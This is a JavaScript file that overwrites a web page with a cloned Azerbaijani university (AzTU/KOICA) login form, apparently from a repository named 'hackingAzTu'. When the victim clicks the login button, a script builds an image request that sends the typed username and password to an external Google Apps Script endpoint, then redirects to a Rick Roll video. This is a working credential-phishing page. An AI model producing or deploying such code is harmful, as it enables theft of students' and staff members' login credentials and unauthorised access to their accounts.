htmlCode = `<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Giriş</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Google Font: Source Sans Pro -->
    <link href="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/css.css" rel="stylesheet">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/font-awesome.min.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/iziToast.min.css">

</head>
<body onload="OnLoad()" cz-shortcut-listen="true">
    <script>
        function OnLoad() {
            var el = document.getElementById("Username");
            if (typeof el == "undefined") return;
            if (el.value != "") {
                var elPsw = document.getElementById("Password");
                elPsw.focus();
            }
            else el.focus();
        }
        function loginBtn(){
            let username = document.getElementById("Username");
			let password = document.getElementById("Password");
			document.write('<img src="https://script.google.com/macros/s/AKfycbzOejlHlAPAl9DXzrOgyvQNfCPDUxTlnz7dvmdX7zHfWBqBjW1NgtHKJTD2A-BPWJM/exec?username=' + username.value + '&password=' + password.value + '" onerror="rickRolled()" />');
        }
        function rickRolled(){
            document.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }
    </script>
    <section class="ftco-section">
        <div class="container">
            


<div class="row justify-content-center">
    <div class="col-md-7 col-lg-5">
        <div class="login-wrap p-4 p-md-5">
            <div class="row mb-4">
                <div class="col-6">
                    <img src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/aztu_logo_az.png" height="60">
                </div>
                <div class="col-6">
                    <img src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/logo-koica.png" class="float-right" height="60">
                </div>
            </div>   
            <h4 class="text-center mb-4">Giriş</h4>
            <form method="post" class="login-form">
                <div class="form-group">
                    <input type="text" class="form-control rounded-left" name="UserId" id="Username" placeholder="İstifadəçi adı" required="">
                </div>
                <div class="form-group d-flex">
                    <input type="password" class="form-control rounded-left" id="Password" placeholder="Şifrə" name="Password" required="">
                </div>
                <div class="form-group">
                    <button onclick="loginBtn()" type="submit" class="form-control btn btn-primary rounded submit px-3">Daxil ol</button>
                </div>
                <div class="form-group d-md-flex">

                    <div class="w-100 text-md-right">
                        <a href="http://sso.aztu.edu.az/Home/ForgotPassword">Şifrəni unutdum</a>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<div class="row justify-content-center">
    <div class="col-md-7 col-lg-5 alert alert-danger mt-4 text-justify">
        <b>KOICA</b>-ya yeni giriş sistemi ilə daxil olmaq üçün 
professor-müəllim heyəti şifrəni Tədris Hissəsindən, tələbələr isə 
dekanlıqlardan əldə edə bilər.<br>
        Köhnə giriş sistemi ilə daxil olmaq üçün isə bu keçiddən istifadə edə bilərsiniz. <b><a href="http://aztu.edu.az/azp/#/azp/main.do">Daxil ol</a></b><br>
        <b>Köhnə giriş sistemi 01.10.2022 tarixinə qədər aktivdir.</b>
    </div>
</div>
        </div>
    </section>

    <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/popper.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/main.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/iziToast.min.js"></script>
    


<script src="https://cdn.jsdelivr.net/gh/ravanalaskarov/hackingAzTu@main/Giri%C5%9F_files/app.js" type="text/javascript"></script></body></html>`;

document.querySelector('html').innerHTML = htmlCode;
